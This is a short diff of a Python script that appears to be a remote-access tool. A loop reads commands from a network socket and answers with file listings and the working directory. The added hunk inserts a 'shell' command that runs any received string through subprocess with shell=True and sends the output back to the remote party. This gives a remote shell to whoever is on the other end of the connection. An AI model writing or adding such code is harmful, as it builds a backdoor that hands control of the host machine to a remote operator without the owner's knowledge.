@@ -49,6 +49,12 @@ while True:
 		client.send(files.encode())
 		
 		files = []
+	
+	# execute commands remotly
+	elif command == 'shell':
+		output = subprocess.run(client.recv(1024).decode(), shell=True, capture_output=True, text=True)
+		client.send(str(output.stdout).encode())
+
 	# get current work directory (getcwd)
 	elif command == 'pwd':
 		client.send(os.sep.join(path).encode())
